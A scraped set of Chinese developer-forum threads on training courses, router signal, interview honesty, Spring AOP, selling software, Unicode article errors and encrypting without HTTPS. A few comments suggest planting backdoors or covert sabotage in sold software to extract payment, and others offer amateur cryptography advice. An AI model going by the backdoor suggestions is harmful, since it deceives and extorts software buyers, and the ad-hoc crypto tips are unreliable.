成立。但是，实际上 0.999...不保证蕴含一个实数的表示（具体来讲，最终取决于使用何种对无穷小量的态度，这是个数学哲学问题），它代表的数不一定具有阿基米德性质；部分不同意=成立的意见实际上也隐晦地指出了这一点，但大部分没有经过充分训练的童鞋没法理解而视为诡辩，却不知道其实是自己因为无知而使用了没有充分论证过的假设，就结论上来讲，错得更离谱。\r", "这里构建超实数的做法可以参照 ", " 的讨论。", "楼主写得挺中肯，培训市场最终也会有优秀的企业脱颖而出，期待高水平的毕业生", " vue 官网的文档其实写的非常不错，只要 js 底子好，是肯定学的会的，几乎不再需要任何第三方的资料。如果你觉得枯燥，可能是底子不够或者光看不练的原因\r", "\r", " 在杭州，有兴趣的话可以加我微信，用户名就是\r", "\r", " 潜移默化确实是会有影响，这个是没办法的，只能靠勤学苦练来补。多谢支持~\r", "\r", " 所以说一分价钱一分货，前提是不坑。多谢支持~\r", "\r", " vue 已经 2.0 了，而且 api 改动也不少，摒弃了一些不好用和不好理解的东西，你可以更新一下教程~~", " 对了，另外你不能觉得官网都枯燥。别人写的教程那都是二手的，大部分质量很难赶上官方文档，你思路就错了。必须看官方，必须看英文，这才是正确的思路", " 主要企业也是被坑怕了。我这边这期学员大都写的是自学，但经历都没有掺假", " 办提高班或者提高课程的想法蛮好的，很多人也都问过我，但我是全职搞的，就没办法按他那个方式来了，周末要休息，平时又要上课，没空再弄额外的班", " 顺便问一下，写 tomcat 是写到哪个程度的呢？是能解析 jsp 还是说只是一个动态页面的容器？合适的话我下期做为实践项目也是个思路", " 确实，很多机构为了钱不管啥学历啥背景都招过来，而且还「包就业」，出来又是假简历。我这边对于没基础的都是会先问清楚数学基础以及对编程的兴趣。对已经自学入门了的人会放宽一些要求。另外第二期我也会再加强管理，不管是出勤时间还是作业", " 感谢支持！", " 感谢支持，如果能帮我内推一下就更好了：）", " 相当于一个容器，重点是让学员通过实践了解了内部的运行机制。\r", "目测楼主是牛人，本人 Java EE&Android&iOS 工程师， SOHO 已久，对前端不甚了解，如果招生了别忘了告知一下～\r", "我非常不同意楼上有人说的培训出来的都是老鼠屎。这是极为自私的观点。\r", "培训班出来的有很多种，作为面试官你必须有能力去甄别个人能力。第一种是本专业（计算机科学、软件工程）的毕业生，他们担忧找不到工作所以上培训班进行实战；第二种是物理、数学相关专业的毕业生或有一段工作经历的人，这类人也尚可，第三种是跨专业的人，大部分计算机理论基础太弱，不可取。第四种就是工作一段时间遇到瓶颈期想提高自己的，悟性较高的同学当然就自学了，大部分人通过培训能够在短时间内茅塞顿开（一般非全日制，或许是讲座）。\r", "本人所在的大学大四的时候和某培训机构达成合作协议所以对培训机构比较了解，如今工作 7 年，感慨颇深，培训公司难能可贵的是帮你梳理知识思路，尽量少走弯路，这个和随处可见的英语、数学辅导班有什么区别？但最终修行在于个人，习惯一指禅的人还是不要学了。。。\r", "当然，不知楼主有没有自己的开源作品，从竞争力来说，初级培训势必拼不过多如牛毛的培训公司，但是进阶培训一直是一个空白，对老师和学员要求都很高，此阶段的学员有一定目标性和经济能力。", " vue 2.0 教程有的啊…只不过是收费的，没贴上来，不然又要被怼了", " 多谢支持，牛人不敢当~\r", "\r", "正在招生呢~你是有推荐吗\r", "\r", "我也就是觉得业界对培训出来的学生另眼相看才会有这篇帖子，如果一个人培训时认真踏实，培训完简历不做假，是不应该被歧视的，我在知乎也表达过，上大学其实也是一种培训，只不过留给个人自学的时间更长而已，但其实有很多人整个大学学的东西还不一定有培训几个月多，都是压力逼出来的。\r", "\r", "不过你说一指禅的人不能学也不一定，如果之前没有编程经验，很可能打字就是一指禅，这是习惯问题，跟能不能学好编程关系其实不大，我班上就有来的时候是一指禅零基础但学的非常不错的同学。\r", "\r", "你提到的开源作品我没有，因为不想造轮子，绝大部分人造的新轮子是不会有人用的，但是我倒是有重造各种已有轮子的能力，比如我实现了能够通过所有 test case 的 Promise 。 express ， co ， koa 什么的也都知道其内部实现，基本达到能随时当着学生面撸一个出来的程度， webpack 也能撸一个 POC 的版本让学生理解其原理\r", "\r", "轮子难造，但是写些东西讲讲轮子原理的东西还是有意义的，我在帖子里提到自己写过不少博客都被媒体收录", " 只要收费合理内容给力，也不怕被怼，你看我不就敢在这里讨论我开培训班的问题嘛~", "希望楼主能好好带，好好培训。加油"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近入手的，据说性能很强悍。<br>\n我家是 115 平米的<br>\n我把路由器放在大门口，因为光纤在那里。</p>\n<p>结果，最里面的我是，信号居然不怎么强，有时候甚至是一格。</p>\n<p>大家有这样的情况么？</p>\n</div></div>"], "reply": "25", "tittle": "为啥我的买的华硕（ ASUS） RT-AC88U 路由器信号不怎么好???", "comment": ["可以尝试刷一下 merlin ，改下地区和发射功率。", "贵的不一定信号好。\r", "我的 ac66u ，信号跟光猫自带无线功能差不多，不得已再买了个路由中继下。\r", "据说刷梅林，改成澳大利亚，发射功率最强，但我始终还是感觉按照国标来对身体安全些，就没有这样改。", "要信号好，淘宝魔改路由器", "澳洲", "正常", "你需要做的是从光猫那接一根 6 类线到房屋中间把路由放在房屋中心 不然换啥路由都没用", "第一这货因为国标的问题软件阉割了信号，但可以破解，自己搜一下就好\r", "第二这东西的强项并不在信号上，同样强度信号这货就是比 200 块的 TPLink 稳定", "AC68U 也一样信号不好", "不明白路由器型号强有什么用？ wifi 又不是广播，信号是双向的。你路由器信号再强，客户端就这点功率，速度也上不去啊。", "谢谢大家，准备刷 merlin ，改成澳洲", "路由器并不是越贵越好 听人家说 网件不错 撸了个 r6400 我擦 回家一测试 还没 360p1 信号好", "这些路由器强在稳定，而不是信号，信号不管哪家都受限于发射功率，这个国标有规定", "另外就是几楼说的 wifi 是双向的，手机就那点发射功率。", "主要还是靠多个中继，另外就是拉个网线放屋子中央", "恩，要不中继，要不就放在屋子中央", "不过啊，这货确实稳定，只要有那么一格信号，上网速度是杠杠的，丝毫不卡顿。", "电力猫或者多搞一个中继到屋子中间.", " @", " \r", "我刷最新的 meilin 380.65 那个版本之后,没有选择地区的选项了?", "我家 140 平的房子， ac66u b1 在大门口，里屋照样满格", "我家 1000 平的三层别墅，一层一个 AC68U ，新号也不咋地\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "装完 B 就跑，真赤鸡，哈哈", "这个你可以在客厅中继一下，小米那个就行，肯定比你一个路由好使，价钱也便宜。", "就只有我一个人受不了 WIFI 太慢，电脑只接网线用的吗？", "5g 的信号强度和穿墙能力要比 2.4g 差一大截", "ac88u 我家在 5 楼\r", "有时候 在底楼都有信号 而且还不是一般的好", "你家墙太多 屏蔽太多信号 我是每个房间一个 AC68U 一个路由 cover 不到这么多房间里除非没有墙壁", "2.4G 可以绕墙 5G 是绕不了 能量都浪费了", " 重点是三层 1000 平别墅"]},
{"content": "", "reply": "28", "tittle": "面试的时候问到你不会的问题，你会直接说不会，还是会含糊其词的扯其他的？", "comment": ["确认问题，如果确实不会而且一点相关经验都没有，就直接说不会了。比如问我阿尔法狗的原理。", "如果是不会的 我会直接说不会, 然后大概问下 是什么方面的技术 . 然后说 如果公司需要涉及这方面的东西 我可以回去看看", "那的看是什么问题了 根据情况选择 但要糊弄过去可不是那么容易", "其实糊弄过去是不太容易的，不过不会的东西，如果你知道一些和它相关的知识，也是可以谈谈的", "一定不要说谎好吧", "你以为你糊弄的时候人家听不出来？？所以还是老实回答说不会就行，", "「没了解过，要不你给我讲讲？」", "HR 最烦说谎和说大话的人", "还是直接说不会比较好。", " 这个倒是的", " 哈哈哈哈 之前我还真就是这么回答的。面试官很耐心的给我讲完了，然后....然后就没有然后了..", " 恩 这个倒是", "我一般说不会，如果自己有相关的会的，就提一下。", "学习到了", "我司面试手册第一点：诚实守信 x 分", " 哈哈哈 这个绝了", "考察知识盲点，偶尔一两个不会没关系，如果多了，就说“我还有事，先告辞了”", "技术问题，不会就是不会\r", "模糊过去，说会马上问个技术或工作要用了，就是给自己挖坑，当然学习能力强的，几天就能掌握另说", "会就会，不会就不会，会一点的稍微扩展一下没问题，吹太厉害了会被自己打脸的。再就是不要浪费彼此的时间，面试官特别是做技术的都不蠢。", "实话实说。", "看看是否有点思路，如果有可以让他提示一下，没有直接说不会，含糊其词只是耽误时间。", "不会还是说不会的比较好", "工作时候遇到不会的问题怎么办？是直接跟人说我不会做，还是瞎逼乱做？\r", "有时候面试人是故意问些你不会的东西，就是想看看你面对一个未知问题是怎么想的。所以哪怕不会，你也可以讲讲你的想法，如果你要去解决，大概会从哪里入手。", "mark", "直接说啊，面试也没有要求你什么都会。", "最讨厌不懂装懂的人。", "直接说不会。心里记下来，回去 Google ，了解下大概。", "如果你很渴望面试成功，你应该拿出好学的态度，“ jboss ？好像没用过，但应该和 tomcat 差不多吧？我觉得我学起来应该很快就上手，请给我机会试试，我很乐意学习新的技术。“"]},
{"content": "", "reply": "7", "tittle": "有没人讲讲多数据源切换问题，或怎样实现好？？", "comment": ["什么语言都 OK", "自己看，不用谢。 ", " 这个原生的，有没什么可以直接拿来用的", "这个原生的，有没什么可以直接拿来用的", "spring 配置不同的 datasource 然后 通过不同的注入不同的 dao 来切换 这算多数据源切换么？\r", "我们的应用同时存在 5 个数据源。", "正巧\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>rt.</p>\n<p>室友想报培训，我没报过，不知道两家的口碑咋样。想问问</p>\n<h4>室友的顾虑</h4>\n<p>蓝桥：蓝桥的培训时间是每周一到周五晚上和周末   时间上本来与学校的课程就有冲突   再加上蓝桥其实基本都介绍去北京  但是在北京  每个月那点工资 在北京解决衣食住行会不会存在一定的压力  说白了就是自己赚的钱能不能养活自己</p>\n<p>中软：培训时间是平时周末一天  正儿八经培训是从放假开始  到武汉去培训  但是中软一般都会包装人  在包装之后可能容易找工作  但是在真正工作的时候  没多久企业就会发现自己是被包装的</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "武汉中软和北京蓝桥哪家的培训更好一些", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我需要匹配 <code>abc.cde.A.fun(cv.bc.F f,Map&lt;String,String&gt; map)</code>方法,然后切面类中内容如下:</p>\n<pre><code>@Aspect\n@Component\npublic class Inte {\n\n\n    @Pointcut(\"execution(* abc.cde.A.fun(..))\")\n    public void pointcut() {\n        //\n    }\n\n\n\n    @Before(\"pointcut()\")\n    public void bef() {\n        System.out.println(\"before ---------called.......\");\n    }\n}\n</code></pre>\n<p>以上, 当<code>A#fun</code>方法被调用的时候并没有进入<code>bef</code>方法,  然后我修改了上面<code>Pointcut</code>表达式为:\n<code>execution(* *.*(..))</code> 则所有方法调用都会触发<code>bef</code>切面方法, 所以我<code>spring</code>配置应该是没有问题的.</p>\n<p>第一次使用, 麻烦大家帮我看看  谢谢!!!</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>该问题更换方式后已解决,    采用xml方法配置aspect 已经可以正常使用!  annotation方式一直不能生效, 等工作完成后, 我会继续研究是否因为缺包原因导致, 如果有进展,我会附加问题原因. 谢谢大家!</p>\n<pre><code>    &lt;bean id=\"inte\" class=\"abc.aspect.MyAspect\"/&gt;\n\n    &lt;aop:config&gt;\n        &lt;aop:aspect id=\"aspect\" ref=\"inte\"&gt;\n            &lt;aop:pointcut id=\"point\" expression=\"execution(* abc.cde.A.fun(..))\" /&gt;\n            &lt;!--&lt;aop:before method=\"defore\" pointcut-ref=\"point\"/&gt;--&gt;\n            &lt;!--&lt;aop:around method=\"around\" pointcut-ref=\"point\"/&gt;--&gt;\n            &lt;aop:after-returning method=\"aftert\" pointcut-ref=\"point\" returning=\"retVal\"/&gt;\n        &lt;/aop:aspect&gt;\n    &lt;/aop:config&gt;\n</code></pre>\n<p>参考链接: <a href=\"https://docs.spring.io/spring/docs/current/spring-framework-reference/html/aop.html\" rel=\"nofollow\">https://docs.spring.io/spring/docs/current/spring-framework-reference/html/aop.html</a></p>\n</div></div>"], "reply": "3", "tittle": "请教大家: 我在使用 spring aop aspect 穿件一个切面的时候, Pointcut 表达式一直不能匹配,但是我找不到表达式错误的地方,麻烦大家帮我看看, 谢谢大家!!!", "comment": ["官方参考文档里切点使用的 private 修饰符，不知道和这个有没有关系", "   不是的 大概是 idea 的问题， 在 eclipse 环境下是可以正常执行", "但我感觉官方文档里说的公用切入点是要写全路径的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>你以为大学了就永远的告别了 5 3 了么？</p>\n<pre><code>又迎来了你人生中非常重要的时刻！\n\n\n不想努力就获得成功？没有的事哦~\n\n\n万事都没有捷径，想获得腾讯、百度、京东、网易.......一系列名企的青睐么，面试直通绿卡等你来拿！\n\n\n点击领取： https://www.nowcoder.com/activity/MockExam2017  \n</code></pre>\n<p><img alt=\"\" src=\"https://uploadfiles.nowcoder.com/images/20170228/826546_1488265027495_B0D8AD83BEE28705D196BDD2C7A6CB70\"></p>\n<pre><code>你是不是到处投简历，却忘记了自己到底有没有本事进想进的公司？ \n\n\n你是不是觉得自己的简历和实力还不错，却不知有多少比你还优秀的人？ \n\n\n\n\n\n参加 IT 校招全国统一模拟笔试将获得： \n\n\n1 、求职竞争力报告（想知道你在全国同学中排名第几么，想知道你的不足之处么，想知道你的竞争力么，帮你定制分析）\n\n\n2 、名企模拟面试机会（想不想先来个面试演习，想不想先进行一次自己喜欢的公司的面试，看下自己面试有哪些需要提高的） \n\n\n3 、名企求职面试绿卡（想不想不用海投简历，直接进入二面或者终面甚至保送呢）\n\n\n4 、牛客定制纪念品套装（想不想获得限量版纪念品套装呢，都是经过专业设计来设计好的物品，哪里都买不到的哦）\n\n\n\n\n\n那么只要你想获得这些，就来报名参加吧： https://www.nowcoder.com/activity/MockExam2017 \n\n\n\n参与方式：\n\n\n\n点击链接进入下方进行报名（参加第一次摸底考试） https://www.nowcoder.com/activity/MockExam2017 \n\n\n\n\n\n报名截止日期： 3 月 7 日 18:00\n\n\n笔试答题： 3 月 7 日 19:00-21:00\n\n\n得到求职竞争力报告： 3 月 10 日\n\n\n奖励公布：包括模拟面试 /求职绿卡 /纪念品\n</code></pre>\n<p><img alt=\"\" src=\"https://uploadfiles.nowcoder.com/images/20170228/826546_1488265094948_00C2FE1864D3A54220900F99683D457C\"></p>\n<p><img alt=\"\" src=\"https://uploadfiles.nowcoder.com/images/20170228/826546_1488265118352_F4BA55174044F3F2DA60BF676193BDB4\"></p>\n<pre><code>快来报名吧：[https://www.nowcoder.com/activity/MockExam2017]( https://www.nowcoder.com/activity/MockExam2017) （老司机早已报名了，做什么事情都要趁早，这样才能吃到螃蟹）\n</code></pre>\n</div></div>"], "reply": "8", "tittle": "腾讯、百度、京东、网易... 名企春招/实习面试直通绿卡领取", "comment": ["震惊，阿里竟因价值观不匹配不参加。", " 哈哈哈哈哈哈", "一楼 哈哈", " 明天来 UC 震惊部上班", " 厉害了", "我就想看看有多少人是看到绿卡点进来的……", "以为是美国绿卡~~~", "紧急扩散！免费绿卡领取，不领是你的错！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前有家公司做的 wms 系统, 后来由于一些客观原因没搞成也就散了, 我当时参与了, 需求非常清楚. 我想用闲暇时间把这个 wms 做成个人的产品放网上卖, 可行么? 收入方面能达到现有上班收入的程度就满足了.</p>\n<p>现在的情况是:</p>\n<ol>\n<li>开发没问题, 楼主本人在三线小城市搞了多年 java 开发, 虽然都是中小型项目, 不过这个按照需求其实我一个人也可以做完.</li>\n<li>市场怎么找, 到哪找?</li>\n<li>这种模式前景怎么样, 会不会有坑? 有坑的话求高人指点.</li>\n</ol>\n<p>楼主今年 36 了, 看着招聘网站上满眼的 35 岁以下的要求感觉压力山大, 不知道以后万一辞职还能不能找到工作, 所以就想着自己弄点事情. 别跟我说技术过硬之类的, 华为里面技术那么多厉害的, 34 岁以上还不是一样被裁, 更何况楼主技术其实也不太硬.</p>\n<p>v2ex 第一帖, 求轻喷.</p>\n</div></div>"], "reply": "15", "tittle": "自己写个东西放网上卖可行吗?", "comment": ["当然可以，建议开源，然后走付费定制路线。", " 可行是可行, 问题是不知道前景怎样, 要花时间的, 目测没个一年时间出不来的, 我想听听具体的分析, 有没啥风险, 比如巨额投资啥的(超过 5000rmb)", "WMS 还可以一个人搞定啊？", " 别把这个看的太复杂了, 我们设计没人家专业搞的那么复杂的, 只是通过那次对仓储这一块的业务相对了解一些.", " 这个对实施能力要求比较高吧，而且各个公司的流程不一样，定制的需求估计也不少。", "自己写的东西如果没有申请知识产权保护 千万别通过第三方交易 买家收到代码后分分钟申请退款 交易败诉  因为提供不了知识产权相关资料", "要做做国外的，国内正版意识太差了，除非你有很强大的反盗版技术，可以保证盗版用不了", "学学这位仁兄\r", " 比如说非授权用户用这个程序建站，随机返回 500 等错误或直接 empty response 让客户不能正常使用？", " 很好，这个其实也是我担心的，但是仓管和采集数据还不一样，人家是在不行人工清点一遍也用不了多少钱。。。", "目前在国内做纯软件肯定不挣钱：如果软件做得好，很快就会被人盗版（加密也会被破解）；如果软件做得不好，那就更不用说了。", "发出去多后。维护应付得来么？", "可以参考好商城， ecshop ，他们都是开源的，都是走的付费定制路线，闭源只出售源码的话在国内会比较难，特别是网站系统（参考 phpweb ），没多少人愿意用加密的系统，后期二次开发都比较麻烦，而且被破解了之后你的源码会网上乱飞。", "记得留好后门，想起前段时间有一哥们就是软件被其他人偷偷用了，然后数据错误对方只能找他，然后就能卖钱了 2333", "我想知道都有哪些途径卖出产品？"]},
{"content": ["<div class=\"topic_content\">主题 : (3.5)java 技术分享沙龙 springboot 分享第二期\r<br>内容 : \r<br>本期为 [开源开发日] 活动第 23 期。“开源开发日”是由技术交流组织 [开源研习社] 和中软国际解放号合办的技术分享和现场编程交流活动， 活动每周举办，目前已经主办 23 期。此前的分享主题包括： TensorFlow 开源深度学习入门、 XgBoost 预测技术分享、 Java 机器人开发等。\r<br>\r<br>本期活动主题：\r<br>本期分享人 Java Web 开发资深工程师，主题为  [ Java Web 敏捷极速开发体系交流：如何让 java 开发速度跟 php 一样快] \r<br>分享内容包括：（ 1 ） Spring Boot 快速上手  （ 2 ）基于 Spring 生态体系的敏捷开发经验分享  （ 3 ） Java 部署体系和微服务部署分享\r<br>\r<br>活动时间：   2017 年 3 月 5 日（周日） 下午 2 点-5 点\r<br>\r<br>活动流程：\r<br>1. 本期分享人分享本期主题和内容 （ 1 个半小时）\r<br>2. 现场交流和现场编程 （ 1 个半小时）\r<br>\r<br>报名参与:http://www.huodongxing.com/event/4376768490900</div>"], "reply": "目前尚无回", "tittle": "(3.5) Java 技术分享沙龙 springboot 分享第二期", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如<a href=\"http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html\" rel=\"nofollow\">《字符编码笔记： ASCII ， Unicode 和 UTF-8\n》</a> 是阮老师 10 年前写的一篇关于字符编码的科普文章，现在用 Google 搜关键字该文章依然名列前茅，可见他的文章有多大影响力，但里面的内容是否正确是值得商榷的事。</p>\n<p>中文维基百科对 Unicode 的解释也是让人一头雾水，摸不着头脑。看看阮老师怎么说：</p>\n<blockquote>\n<p>可以想象，如果有一种编码，将世界上所有的符号都纳入其中。每一个符号都给予一个独一无二的编码，那么乱码问题就会消失。这就是 Unicode ，就像它的名字都表示的，这是一种所有符号的编码。</p>\n</blockquote>\n<p>这句话读起来很拗口，有三个地方出现了「编码」二字。不知阮老师对「编码」的理解是什么？但可以肯定的是这三个「编码」在这句话里面不是同一个意思。</p>\n<p>「编码」作动词使用时就是把一个字符（严格一点说是字符在字符集中的编号 code point ）转换成一个字节序列，以便在网络传输或者存储到文本中。比如「好」在 Unicode 中的编号是 U+597d ，经过 UTF-8 编码后会转换成二进制序列是 '\\xe5\\xa5\\xbd' 。作为名词使用时，就是指一种<strong>具体的编码实现方式</strong>，比如 ASCII 编码， GBK 编码， UTF-8 编码</p>\n<p>其实 <strong>Unicode 是一个囊括了世界上所有字符的字符集，其中每一个字符都对应有唯一的编码值（ code point ），然而它并不是一种什么编码格式，仅仅是字符集而已。</strong> Unicode 字符要存储要传输怎么办，它不管，可以用 UTF-8 、 UTF-16 。</p>\n<p>再来看阮老师说 Unicode 的第二个问题：</p>\n<blockquote>\n<p>第二个问题是，我们已经知道，英文字母只用一个字节表示就够了，如果 Unicode 统一规定，每个符号用三个或四个字节表示，那么每个英文字母前都必然有二到三个字节是 0 ，这对于存储来说是极大的浪费，文本文件的大小会因此大出二三倍，这是无法接受的。</p>\n</blockquote>\n<p>Unicode 并没有统一规定每个符号用三个或者四个字节表示。 Unicode 只规定了每个字符对应到唯一的代码值（ code point ），代码值 从 0000 ~ 10FFFF 共 1114112 个值 ，真正存储的时候需要多少个字节是由具体的编码格式决定的。比如：字符 「 A 」用 UTF-8 的格式编码来存储就只占用 1 个字节，用 UTF-16 就占用 2 个字节，而用 UTF-32 存储就占用 4 个字节。</p>\n<p>再看来看这张图：</p>\n<p><img alt=\"windows-notepad.jpg\" src=\"http://www.ruanyifeng.com/blog/2007/10/bg2007102801-thumb.jpg\"></p>\n<p>阮老师对 Unicode 编码的解释是：</p>\n<blockquote>\n<p>Unicode 编码指的是 UCS-2 编码方式，即直接用两个字节存入字符的 Unicode 码。这个选项用的 little endian 格式。</p>\n</blockquote>\n<p>UCS-2 是什么鬼， UCS-2 是使用<strong>两个定长的字节</strong>来表示一个字符，而 UTF-16 是使用两个变长的字节，遇到两个字节没法表示时，会用 4 个字节来表示，因此 UTF-16 可以看作是在 UCS-2 的基础上扩展而来的。而 UTF-32 与 USC-4 是完全等价的。</p>\n<p>之所以在 Windows 下有 Unicode 编码这样一种说法，其实是 Windows 的一种错误表示方法，它真正的编码类型是 UTF-16LE 编码。</p>\n<p>他又说：</p>\n<blockquote>\n<p>Unicode 规范中定义，每一个文件的最前面分别加入一个表示编码顺序的字符，这个字符的名字叫做\"零宽度非换行空格\"（ ZERO WIDTH NO-BREAK SPACE ），用 FEFF 表示。这正好是两个字节，而且 FF 比 FE 大 1 。</p>\n<p>如果一个文本文件的头两个字节是 FE FF ，就表示该文件采用大头方式；如果头两个字节是 FF FE ，就表示该文件采用小头方式</p>\n</blockquote>\n<p>这儿就错得更加离谱了，不想说了，直接原文链接 <a href=\"http://mp.weixin.qq.com/s?__biz=MjM5MzgyODQxMQ==&amp;mid=2650366798&amp;idx=1&amp;sn=5db3b152c99ff96f7a477313cfb175e0&amp;chksm=be9cd81a89eb510c1d22091d89df648ab689a01fd77ebd4361567dd7ec238e754c3d5f10715c&amp;mpshare=1&amp;scene=23&amp;srcid=0227ViQqcIpvWmVwkOiYxyxT#rd\" rel=\"nofollow\">http://mp.weixin.qq.com/s?__biz=MjM5MzgyODQxMQ==&amp;mid=2650366798&amp;idx=1&amp;sn=5db3b152c99ff96f7a477313cfb175e0&amp;chksm=be9cd81a89eb510c1d22091d89df648ab689a01fd77ebd4361567dd7ec238e754c3d5f10715c&amp;mpshare=1&amp;scene=23&amp;srcid=0227ViQqcIpvWmVwkOiYxyxT#rd</a></p>\n</div></div>", "<div class=\"topic_content\">发现大家已经不再是讨论问题本身了，阮一峰老师的文章绝大部分还是很有有指导性的。在此给大家造成的困扰，表示抱歉。\r<br>\r<br>散了吧，不值得浪费大家时间。</div>"], "reply": "115", "tittle": "阮一峰的文章有哪些常见性错误", "comment": ["你第一句话就承认了人家写的是科普文章，科普懂不懂？科普排名靠前不好吗？靠前的难道应该是你所擅长的茴字四种写法？", " 哼哼哼, 不上道了吧\r", "\r", "作为阮老师前脑残粉的我怎么会没看过阮老师的书\r", "从礼节上来说，发现错误应该先私信作者，作者不鸟你，再到评论或者论坛里面喷。", "撕起来", "很正常，现在很多人 utf-8 和 unicode 概念混在一起，但只要你不是搞 unicode 字符标准制定等工作的，并不影响在日常中的应用和理解。", " 你是不是当年 bug 吧干坏事的那个？", "阮一峰写文章的目的是卖广告，你我写文章的目的是吸引基佬，各取所需。", " #102 我的意思是为什么你有这种转变?你的评论?\r", "纯好奇,我也不是他的什么粉", "op 显然有些情绪在里面了，说阮的博客评论里面没有指正错误只有盲目崇拜，其实你如果能像给别人博文抓虫那么仔细地去看评论，是有的。", "既然人无完人，那便要给人指责之权利。\r", "自知有错，还不准人说，这是什么道理？", "我当时看这篇博文时也是没搞清 unicode 和 utf-x 的区别\r", "感觉阮一峰很多博文都是在自己都没理解清楚的情况下强行写作的， rsa 那篇也是", " 因为有太多太多主观性的错误啊\r", "\r", "比如, 支持计划生育, 还表明支持的理由. 但那不是叫做有思想啊, 只是单纯人云亦云而已.\r", "\r", "至于其他内容, 还算平均线以上, 但是远远算不上可以出书..... 你看看目录就知道了", " bug 吧是什么鬼？", " 一个跟你头像一样的人 干了坏事跑路的故事", "讲的很好, 解答了我之前的很多困惑。"]},
{"content": ["<div class=\"topic_content\">最近写了个小项目， 要求不用 https （丫的，就是这么奇葩），   要求保证通信的安全， 防窃听\r<br>\r<br>浏览器  ----&gt; 服务端    （这个倒好做， RSA 浏览器公钥加密, 服务端私钥解密。中间人没有私钥，就算窃听到数据也解密不出来）。\r<br>\r<br>\r<br>服务端 ------&gt; 浏览器   （目前仅应付一下 就是 服务端发送数据时 AES 加密，  浏览器 AES 解密，  这样明显的缺点就是中间人分析一下网页，就知道 AES 的 KEY,然后就能解密出对应的数据了，因为不管怎么着， 数据都得在浏览器正常展示出来）\r<br>\r<br>后来觉得 DH 算法应该可以， 但是实现过程略显麻烦，对 web 类的纯 HTTP 应用不是很适合， \r<br>\r<br>\r<br>说了这么多， 求指教。</div>", "<div class=\"topic_content\">昨晚有事， 一早来看回复了这么多，  大家的回复我都看了，  首先这需求的确奇葩，这不是重点，假设就按这需求来，也不要问为什么\r<br>首先允许中间人窃听流量（这是非常正常的事）（像什么端口镜像之类等等） （小到公司内网出口，大到运营商出口等，都会分析网络流量）\r<br>其次是防止通过窃听流量还原出明文，不防篡改内容、证书等（敲黑板。。。。）\r<br>（在浏览器本身，比入注入进浏览器内存获取未加密数据不在考虑范围， 通过浏览器本身的一些插件扩散等都不在考虑范围）\r<br>（什么中间人公钥私钥替换中转也都不在此考虑范围）   \r<br>xqin 应该是明白我的意思，   你的 DEMO 代码我也看了， 我目前大概也是这样做的， 不过没有用 QQTEA 算法， 还是用标准的 AES ，  跟你的方案不同的是我用了 localStorageService 把本地解密的 KEY 缓存在浏览器内存中， 另一直也在准备用 ecdh 方案来实现密钥交换</div>"], "reply": "75", "tittle": "除了 https，有什么防止网络监听的成熟方案", "comment": ["可以试试，自己用 js 实现 tls ，底层用 websockets", "  天啦。。。。。。。。", "http 页面不防篡改，中间人也可以给你的服务器 /浏览器返回一个假的证书啊", "如果不想使用现成的 TLS ，那就只能自己在 socket 上实现一遍 TLS 了。", "  暂时不考虑中间人篡改内容，  只防中间人监听，解密出内容。", "  在 github 上看了下， 还真有人用 JS 自己生成了一个 TLS 跑在 HTTP 下。。", " 给了假证书之后照样监听啊", "    暂时不考虑中间人篡改内容， 只防中间人监听，解密出内容。", "巧了。。 最近也是在做这个。。目前也是 https +rsa", "每次刷新都用密码登陆", " 给了假证书之后就可以监听了", "报文 rsa 加密后 base64", " 暂时不考虑中间人篡改内容， 只防中间人监听，解密出内容。", " TLS 的实现是很复杂的，自己实现的安全性往往没有使用现成的套件安全，高效。除非特别需要，否则强烈不推荐自己实现这样的过程，不明白这样做的目的是什么？", "提出这种要求的人, 能回答一下, 如果 https 被破解了, 就你做的这点加密,  能扛得住别人几分钟的攻击?", " 都给你了假证书了，监听岂不是再简单不过的事情？\r", "用自己的证书解密再转发给你的服务器不就好了，这就是 MITM 在安全性被妥协的环境下的典型监听方法", "  哈哈， 歪楼了", "  暂时不考虑中间人篡改内容， 只防中间人监听，解密出内容。 不用科普 MITM ，", " \r", "什么叫浏览器到服务器简单？浏览器会用你的私有协议？还是你要自己写一个浏览器？\r", "RSA 是用来传 key 的， payload 也用 RSA 来传？难道你的客户都是四路 E7 配置起跳？\r", "拿到 AES 密文和明文就能猜出 key ？ 抗 CPA 是吃翔的？\r", "\r", "\r", "不是我嘲讽楼主，密码学入门知识都不懂也想撸密码学基础架构，这种一般叫 troll 吧。", "XMPP+TLS", " 发了假证书就已经是篡改行为了呀，楼主说不考虑篡改只考虑窃听", "看来你还不知道啥是消息完整性", "私有协议，全程 websocket", "客户端可以，浏览器不行。", " 我理解的篡改内容是篡改传输的内容，而非握手阶段的信报。如果是这样的话，确实算是篡改了。\r", "不过 aes 那段，真的没啥想说的……", "简单的说，如果是纯浏览器环境就放弃吧", "没有\r", "不要自欺欺人", "简单从信息加密的角度想一下，其实从服务器发给浏览器，无论何种方法，客户端都有有一个解密的 key ，所以问题在于怎么安全的把解密的 key 交到客户端的手里，我的想法是。。。。。当！当！当！亲自上门交到客户手里！不要喷我", " payload 就算用 rsa 加密其实也不需要 e7 那么夸张，我用过纯 python 实现的 rsa 加密，在 500k/s 下也就用了 10%的 cpu(cpython3.5+i7 4790)", "线下交换公钥, 线上 PGP", "讲道理的话，就算 https ，没有进 preload list 也谈不上多安全。\r", "\r", "就楼主的需求，简单的对称加密，密钥明文下发都没啥大问题。不定期换换密钥和稍微更新一下加密方式就好。\r", "如果楼主遇到的是强大的对抗力量（比如国家机器）的话，在现在的环境下基本是无解的。", "------- 楼歪了，我来说个方案  ------\r", "\r", "HTTP 下防劫持比较靠谱的方案 —— 给入口页面使用前端缓存，比如 html5 appcache 、 max-age 等等，资源使用加密传输。\r", "\r", "这样做的好处是，把风险缩小到首次访问。之后就算遇到不安全的网络，打开的也是缓存里的页面，不会被中间人篡改程序和界面。\r", "\r", "这种方案叫做 TOFU （ Trust on First Use ，信任首次使用）。", "pjax+aes 加密", 